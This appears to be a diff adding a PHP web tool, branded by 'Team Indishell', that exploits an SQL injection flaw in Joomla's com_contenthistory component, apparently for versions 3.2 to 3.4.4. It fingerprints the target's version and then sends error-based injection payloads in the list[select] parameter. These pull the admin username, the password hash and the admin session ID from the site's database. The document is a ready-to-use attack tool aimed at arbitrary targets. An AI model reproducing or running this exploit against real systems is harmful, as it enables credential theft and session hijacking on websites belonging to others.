@@ -1,0 +1,231 @@
+<?php session_start();
+error_reporting(0);
+set_time_limit(0);
+
+$head = '
+<html>
+<head>
+<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLfLXmLeMSTt0jOXREfgvdp8IYWnE9_t49PpAiJNvwHTqnKkL4" rel="icon" type="image/x-icon"/>
+</script>
+<title>--==[[Mannu joomla SQL Injection exploiter by Team Indishell]]==--</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<STYLE>
+body {
+font-family: Tahoma;
+color: white;
+background: #444444;
+}
+
+input {
+border			: solid 2px ;
+border-color		: black;
+BACKGROUND-COLOR: #444444;
+font: 8pt Verdana;
+
+color: white;
+}
+
+submit {
+BORDER:  buttonhighlight 2px outset;
+BACKGROUND-COLOR: Black;
+width: 30%;
+color: #FFF;
+}
+
+#t input[type=\'submit\']{
+	COLOR: White;
+	border:none;
+	BACKGROUND-COLOR: black;
+}
+
+#t input[type=\'submit\']:hover {
+	
+	BACKGROUND-COLOR: #ff9933;
+	color: black;
+	
+}
+tr {
+BORDER: dashed 1px #333;
+color: #FFF;
+}
+td {
+BORDER: dashed 0px ;
+}
+.table1 {
+BORDER: 0px Black;
+BACKGROUND-COLOR: Black;
+color: #FFF;
+}
+.td1 {
+BORDER: 0px;
+BORDER-COLOR: #333333;
+font: 7pt Verdana;
+color: Green;
+}
+.tr1 {
+BORDER: 0px;
+BORDER-COLOR: #333333;
+color: #FFF;
+}
+table {
+BORDER: dashed 2px #333;
+BORDER-COLOR: #333333;
+BACKGROUND-COLOR: #191919;;
+color: #FFF;
+}
+textarea {
+border			: dashed 2px #333;
+BACKGROUND-COLOR: Black;
+font: Fixedsys bold;
+color: #999;
+}
+A:link {
+border: 1px;
+	COLOR: red; TEXT-DECORATION: none
+}
+A:visited {
+	COLOR: red; TEXT-DECORATION: none
+}
+A:hover {
+	color: White; TEXT-DECORATION: none
+}
+A:active {
+	color: white; TEXT-DECORATION: none
+}
+</STYLE>
+<script type="text/javascript">
+<!--
+    function lhook(id) {
+       var e = document.getElementById(id);
+       if(e.style.display == \'block\')
+          e.style.display = \'none\';
+       else
+          e.style.display = \'block\';
+    }
+//-->
+</script>
+'; 
+
+
+
+		echo $head ;
+		echo '
+
+<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
+
+			
+
+       <td width="100%" align=center valign="top" rowspan="1">
+           <font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ Mannu, Joomla </font><font color=white size=5 face="comic sans ms"><b>SQL Injection exploiter By Team </font><font color=green size=5 face="comic sans ms"><b> INDIShEll]]==--</font> <div class="hedr"> 
+
+        <td height="10" align="left" class="td1"></td></tr><tr><td 
+        width="100%" align="center" valign="top" rowspan="1"><font 
+        color="red" face="comic sans ms"size="1"><b> 
+        <font color=#ff9933> 
+        ##########################################</font><font color=white>#############################################</font><font color=green>#############################################</font><br><font color=white>
+        -==[[Greetz to]]==--</font><br> <font color=#ff9933>Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indisHell,Baba ,Silent poison India,Magnum sniper,ethicalnoob IndisHell,Local root indisHell,Irfninja indisHell<br>Reborn India,L0rd Crus4d3r,cool toad,Hackuin,Alicks,Dinelson Amine,Th3 D3str0yer,SKSking,rad paul,Godzila,mike waals,zoo zoo,cyber warrior,Neo hacker ICA<br>cyber gladiator,7he Cre4t0r,Cyber Ace, Golden boy INDIA,Ketan Singh,Yash,Aneesh Dogra,AR AR,saad abbasi,hero,Minhal Mehdi ,Raj bhai ji , Hacking queen ,lovetherisk and rest of TEAM INDISHELL<br>
+<font color=white>--==[[Love to]]==--</font><br># My Father , my Ex Teacher,cold fire HaCker,Mannu, ViKi,Suriya Cyber Tyson ,Ashu bhai ji,Soldier Of God,almas malik, Bhuppi,Mohit, Ffe ^_^,Ashish,Shardhanand,Govind singh,Budhaoo,Don(Deepika kaushik) and acche bacchi(Jagriti) <br>
+<font color=white>--==[[Interface Desgined By]]==--</font><br><font color=red>GCE College ke DON :D</font>        <br></font>
+        <b> 
+        <font color=#ff9933> 
+        ##########################################</font><font color=white>#############################################</font><font color=green>#############################################</font>
+						
+           </table>
+       </table> <br>
+
+';
+?>
+<div align=center>
+<form method=post>
+<input type=input name=in value=target>
+<input type=submit name=sm value="check version">
+
+<?php
+ function data($lu)
+{
+	$ch = curl_init();
+
+curl_setopt($ch, CURLOPT_URL, $lu);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
+$result['EXE'] = curl_exec($ch);
+curl_close($ch);
+return $result['EXE'];
+
+
+}
+
+
+if(isset($_POST['sm']))
+{
+$target=trim($_POST['in']);
+$finalurl=$target."/language/en-GB/en-GB.xml";
+
+$data=file_get_contents($finalurl);	
+$ar0=explode("<version>", $data);
+$ar1=explode("</version>", $ar0[1]);
+$ar=trim($ar1[0]);
+echo "<br>";
+$v=explode(".",$ar);
+
+
+if($v[0]<=3)
+{
+	//echo "<br><br> Joomla version is 3.*.*";
+	
+		
+		//echo "<br> yes yes >:D<, fas gaya billu ";
+		echo "<br>click below button to exploit it :v <br><br>" ;
+		echo "<form method=post><input type=hidden name=tar value=".$target.">";
+		echo "<input type=submit name=sm1 value=\"Chal billu, ghuma de soday ne xD\">";
+	
+	
+}
+else{
+	
+	echo "joomla version is below 3";
+}
+
+}
+
+if(isset($_POST['sm1']))
+{
+
+$tar=$_POST['tar']."/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=75&type_id=1&list[select]=(select+1+from+(select+count(*),+concat((select+(select+concat(password))+from+icalab_users+LIMIT+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)";
+
+$dat=data($tar); 
+$ar0=explode("LEFT JOIN", $dat);
+$ar1=explode("_users", $ar0[1]);
+$ar=trim($ar1[0]);
+
+$rt=str_replace("icalab",$ar,$tar);
+$tr=data($rt);
+$ar0=explode("Duplicate entry", $tr);
+$ar1=explode("for key", $ar0[1]);
+
+
+ $rt2=str_replace("password","username,0x7e",$rt);
+$tr2=data($rt2);
+$ar2=explode("Duplicate entry", $tr2);
+$ar3=explode("for key", $ar2[1]);
+
+if($ar3[0]!='' && $ar1[0]!='')
+{
+echo "<br><br> 	Target gone 8-)<br><br>website name:- ".$_POST['tar']." <br>-------------------------------<br> <br>";
+echo "username is --> ".str_replace("~1","",trim($ar3[0]))." <br>Password Hash is --> ".str_replace("~1","",trim($ar1[0]));
+echo "<br>Admin session ID is<br></div>";
+$sessionid=$_POST['tar']."/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=75&type_id=1&list[select]=(select+1+from+(select+count(*),+concat((select+(select+concat(session_id))+from+".$ar."_session+where+username='admin'+LIMIT+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)";
+
+$ses=data($sessionid);
+$ar0=explode("Duplicate entry", $ses);
+$ar1=explode("for key", $ar0[1]);
+echo trim($ar1[0]);
+}
+}
+
+?>
+<!-- 3.2.* to 3.4.4 -->
